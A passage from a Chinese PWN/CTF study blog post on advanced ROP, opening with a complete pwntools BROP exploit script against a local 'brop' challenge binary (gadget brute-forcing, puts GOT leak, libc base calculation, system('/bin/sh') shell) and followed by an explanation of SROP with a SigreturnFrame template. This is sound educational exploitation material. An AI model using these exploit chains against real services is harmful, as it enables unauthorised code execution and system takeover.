#1.暴力枚举出栈溢出长度
def getsize():
    i &#x3D; 1
    while 1:
        try:
            p &#x3D; process(&#39;.&#x2F;brop&#39;)
            p.recvuntil(&quot;WelCome my friend,Do you know password?\n&quot;)
            p.send(i*&#39;a&#39;)
            data &#x3D; p.recv()
            p.close()
            if not data.startswith(b&#39;No password&#39;):
                return i-1
            else:
                i+&#x3D;1
        except EOFError:#主要探测是否具有canary
            p.close()
            return i-1
 
size &#x3D; getsize()
print (&quot;size is : %s &quot;% size)

from pwn import *

#2
def get_stop():
    addr &#x3D; 0x4005cf
    while 1:
        sleep(0.1)
        addr +&#x3D; 1
        try:
            print(&quot;Now,trying the address is &quot;,hex(addr))
            p &#x3D; process(&#39;.&#x2F;brop&#39;)
            p.recvuntil(b&quot;WelCome my friend,Do you know password?\n&quot;)
            payload &#x3D; b&#39;a&#39;*72 + p64(addr)
            print(&quot;Now,the payload is &quot;,payload)
            p.sendline(payload)
            data &#x3D; p.recv()
            p.close()
            if data.startswith(b&#39;WelCome&#39;):
                print (&quot;main funciton--&gt;[%s]&quot;%hex(addr))
                return addr
            else:
                print (&#39;one success addr : 0x%x&#39;%hex(addr))
        except EOFError as e:
            p.close()
            print(&quot;a bad addr&quot;,hex(addr))
        except:
            print(&quot;Can&#39;t connect,retrying&quot;)
            addr -&#x3D; 1
 
data &#x3D; get_stop()
print (&quot;Success,call Main Function address is&quot;,hex(data))
from pwn import *

#3
def get_brop_gadget(length, stop_gadget, addr): #查找brop gadget函数
    try:
        sh &#x3D; process(&#39;.&#x2F;brop&#39;)
        sh.recvuntil(b&#39;password?\n&#39;)
        payload &#x3D; b&#39;a&#39; * length + p64(addr) + p64(0)*6 + p64(stop_gadget) 
        sh.sendline(payload)
        content &#x3D; sh.recv()
        sh.close()
        print (content)
        if not content.startswith(b&#39;WelCome&#39;):
          #判断提示符是否出现起始提示字符，如果有说明程序没崩溃
            return False
        return True
    except Exception:
        sh.close()
        return False

def check_brop_gadget(length, addr):#检查地址
    try:
        sh &#x3D; process(&#39;.&#x2F;brop&#39;)
        sh.recvuntil(b&#39;password?\n&#39;)
        payload &#x3D; b&#39;a&#39; * length + p64(addr) + b&#39;a&#39; * 8 * 10
        sh.sendline(payload)
        content &#x3D; sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True

#4
##length &#x3D; getbufferflow_length()
length &#x3D; 72
##get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
addr &#x3D; 0x4007b0 
#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400740之后，所以为了减少误差，从0x400740开始
while 1:  #循环递增要测试的地址
    print (hex(addr))
    if get_brop_gadget(length, stop_gadget, addr):
        print (&#39;possible brop gadget: 0x%x&#39; % addr)
        if check_brop_gadget(length, addr):
            print (&#39;success brop gadget: 0x%x&#39; % addr)
            break
    addr +&#x3D; 1

def get_puts_addr(length, rdi_ret, stop_gadget):
    addr &#x3D; 0x400559
    while 1:
        print (hex(addr))
        sh &#x3D; process(&#39;.&#x2F;brop&#39;)
        sh.recvuntil(b&#39;password?\n&#39;)
        payload &#x3D; b&#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃
        sh.sendline(payload)
        try:
            content &#x3D; sh.recv()
            if content.startswith(b&#39;\x7fELF&#39;):#判断是否打印\x7fELF
                print (&#39;find puts@plt addr: 0x%x&#39; % addr)
                return addr
            sh.close()
            addr +&#x3D; 1
        except Exception:
            sh.close()
            addr +&#x3D; 1

##length &#x3D; getbufferflow_length()
length &#x3D; 72
rdi_ret &#x3D; 0x4007ba+0x9
##get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
puts &#x3D; get_puts_addr(length,rdi_ret,stop_gadget)

#5
##length &#x3D; getbufferflow_length()
length &#x3D; 72
##stop_gadget &#x3D; get_stop_addr(length)
stop_gadget &#x3D; 0x4005d0
##brop_gadget &#x3D; find_brop_gadget(length,stop_gadget)
brop_gadget &#x3D; 0x4007ba
rdi_ret &#x3D; brop_gadget + 9
##puts_plt &#x3D; get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt &#x3D; 0x400565
##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got &#x3D; 0x601018
ret &#x3D; brop_gadget + 9 + 1#栈对齐
sh &#x3D; process(&#39;.&#x2F;brop&#39;)
sh.recvuntil(b&#39;password?\n&#39;)
payload &#x3D; b&#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
sh.sendline(payload)
data &#x3D; sh.recv(6).ljust(8,b&#39;\x00&#39;)
sh.recv()
puts_addr &#x3D;u64(data)
print(hex(puts_addr))
libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)
libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]
print(hex(libc_base))
system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]
binsh_addr &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
payload &#x3D; b&#39;a&#39; * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="😭SROP-暂时学不懂，待续"><a href="#😭SROP-暂时学不懂，待续" class="headerlink" title="😭SROP(暂时学不懂，待续)"></a>😭SROP(暂时学不懂，待续)</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12644">文章 - 高级ROP之SROP利用 - 先知社区</a><br>SROP，全称为Sigreturn Oriented Programming，主要触发原理为<code>sigreturn</code>这个系统调用，这个系统调用一般是程序在发生 signal 的时候被间接地调用</p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>分析内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>
<ul>
<li><strong>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</strong></li>
<li><p>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，<strong>所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame</strong>。<br>说到这里，其实，SROP 的基本利用原理也就出现了。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>看完原理之后我们可以发现，<code>sigreturn</code> 系统调用会将进程恢复为<strong>之前”保存的</strong>“，也就是从栈中pop回到各寄存器，在执行<code>sigreturn</code> 系统调用期间，我们对栈中的值是可以任意读写的，而且由于内核与信号处理程序无关， <code>signal</code> 对应的各个寄存器值并不会被记录，那么，只要我们能够劫持栈中的数据，伪造一个 <code>Signal Frame</code> ，那么就可以控制任意寄存器的值</p>
<h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息<br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180326.png" alt="Pasted image 20250207180326"><br>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。获取shell实际上就是执行了系统调用 execve(“/bin/sh”,0,0)<br>获取shell需要满足以下条件：</p>
</li>
<li><p>栈溢出以控制栈的内容</p>
</li>
<li>能控制rax寄存器为<code>sigreturn</code> 系统调用函数的调用号</li>
<li>有syscall系统调用函数或者汇编代码</li>
<li>栈空间足够大</li>
</ul>
<p>具体SROP操作如下</p>
<ol>
<li>通过栈溢出劫持返回地址，构造SROP</li>
<li>控制rax寄存器为<code>sigreturn</code> 的系统调用号</li>
<li>执行syscall进入<code>sigreturn</code> 系统调用</li>
<li>控制栈布局，使<code>sigreturn</code> 系统调用结束后的pop指令能够准确控制各个寄存器成我们想要的值<br> 例如获取shell的各寄存器控制：<br> rax —&gt;59（execve的系统调用号）<br> rdi —&gt; ‘/bin/sh’<br> rsi —&gt; 0<br> rdx —&gt;0<br> rip —&gt; syscall<br> 此时再继续向下调用时就可以执行execve(“/bin/sh”,0,0)了<h4 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h4>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</li>
</ol>
<ul>
<li><strong>控制栈指针。</strong></li>
<li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong><br>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。<br><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180429.png" alt="Pasted image 20250207180429"><h4 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h4>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</li>
<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
<li><strong>需要知道相应的地址</strong><ul>
<li><strong>“/bin/sh”</strong></li>
<li><strong>Signal Frame</strong></li>
<li><strong>syscall</strong></li>
<li><strong>sigreturn</strong></li>
</ul>
</li>
<li>需要有够大的空间来塞下整个 sigal frame<br>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：<img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180522.png" alt="Pasted image 20250207180522">并且，作者发现，有些系统上 SROP 的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核)，可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下<img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180547.png" alt="Pasted image 20250207180547">但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。</li>
</ul>
<p><em>值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</em></p>
<h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p><img src="/img/loading.gif" data-original="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180210.png" alt="Pasted image 20250207180210"></p>
<p><strong><em>值得一提的是，在目前的 pwntools 中已经集成了对于 srop 的攻击。</em></strong><br>pwntools集成了有关SROP链的构造函数 <code>SigreturnFrame()</code><br>工具构造和利用如下：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">frame &#x3D; SigreturnFrame()
frame.rax &#x3D; 
frame.rdi &#x3D; 
frame.rsi &#x3D; 
frame.rdx &#x3D; 
frame.rcx &#x3D; 
frame.rip &#x3D; 
frame.rsp &#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>用与参与栈布局的构造<br>在payload构造中利用bytes(frame)包裹即可</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop">ctf-challenges/pwn/stackoverflow/srop/2016-360春秋杯-srop at master · ctf-wiki/ctf-challenges</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io">Zechariah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/">https://zechariah-0703.github.io/2025/02/19/PWN入门-进阶ROP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zechariah-0703.github.io" target="_blank">Zechariahの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/%E6%A0%88/">栈</a></div><div class="post_share"><div class="social-share" data-image="/img/fengmian.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/02/22/Art-of-shellcode/" title="Art_of_shellcode"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Art_of_shellcode</div></div></a></div><div class="next-post pull-right"><a href="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/" title="PWN技巧-栈迁移"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN技巧-栈迁移</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/" title="PWN入门-基本ROP"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-11</div><div class="title">PWN入门-基本ROP</div></div></a></div><div><a href="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="PWN入门-栈溢出"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-03</div><div class="title">PWN入门-栈溢出</div></div></a></div><div><a href="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/" title="PWN技巧-栈对齐"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-16</div><div class="title">PWN技巧-栈对齐</div></div></a></div><div><a href="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/" title="PWN技巧-栈迁移"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-18</div><div class="title">PWN技巧-栈迁移</div></div></a></div><div><a href="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/" title="PWN技巧-绕过Canary的几种姿势"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-26</div><div class="title">PWN技巧-绕过Canary的几种姿势</div></div></a></div><div><a href="/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/" title="AWD学习"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-16</div><div class="title">AWD学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zechariah</div><div class="author-info__description">不会密码的逆向手不是好PWN手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Zechariah-0703"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6ROP"><span class="toc-number">1.</span> <span class="toc-text">进阶ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2-libc-csu-init-64%E4%BD%8DELF"><span class="toc-number">1.1.</span> <span class="toc-text">ret2__libc_csu_init(64位ELF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">通用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E8%AE%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ROPgadget"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">1.ROPgadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9C%8B%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">2.看机器码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2reg"><span class="toc-number">1.2.</span> <span class="toc-text">ret2reg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#brop"><span class="toc-number">1.3.</span> <span class="toc-text">brop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">攻击条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.3.</span> <span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.4.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E7%AD%94%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">解答思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E7%AD%94%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">解答步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%A0%88%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.4.2.1.</span> <span class="toc-text">1.判断栈溢出长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%AF%BB%E6%89%BEstop-gadget"><span class="toc-number">1.3.4.2.2.</span> <span class="toc-text">2.寻找stop gadget</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%AF%BB%E6%89%BEbrop-gadget"><span class="toc-number">1.3.4.2.3.</span> <span class="toc-text">3.寻找brop gadget</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%AF%BB%E6%89%BEputs-plt%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.4.2.4.</span> <span class="toc-text">4.寻找puts@plt地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%B3%84%E9%9C%B2puts-got%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.4.2.5.</span> <span class="toc-text">5.泄露puts_got地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E6%9F%A5%E8%AF%A2libc%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.4.2.6.</span> <span class="toc-text">6.查询libc版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-getshell"><span class="toc-number">1.3.4.2.7.</span> <span class="toc-text">7.getshell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%ADSROP-%E6%9A%82%E6%97%B6%E5%AD%A6%E4%B8%8D%E6%87%82%EF%BC%8C%E5%BE%85%E7%BB%AD"><span class="toc-number">1.4.</span> <span class="toc-text">😭SROP(暂时学不懂，待续)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-call-chains"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">system call chains</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">后续</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">实际利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/" title="关于我"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于我"/></a><div class="content"><a class="title" href="/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/" title="关于我">关于我</a><time datetime="2025-03-27T11:02:23.000Z" title="发表于 2025-03-27 19:02:23">2025-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="PWN刷题笔记（长期更新）"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN刷题笔记（长期更新）"/></a><div class="content"><a class="title" href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="PWN刷题笔记（长期更新）">PWN刷题笔记（长期更新）</a><time datetime="2025-03-25T13:39:37.000Z" title="发表于 2025-03-25 21:39:37">2025-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web-PWN知识"/></a><div class="content"><a class="title" href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识">Web-PWN知识</a><time datetime="2025-03-11T13:48:48.000Z" title="发表于 2025-03-11 21:48:48">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/unlink/" title="unlink"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unlink"/></a><div class="content"><a class="title" href="/2025/03/11/unlink/" title="unlink">unlink</a><time datetime="2025-03-10T16:25:24.000Z" title="发表于 2025-03-11 00:25:24">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/" title="堆入门-__malloc_hook和__free_hook劫持原理"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="堆入门-__malloc_hook和__free_hook劫持原理"/></a><div class="content"><a class="title" href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/" 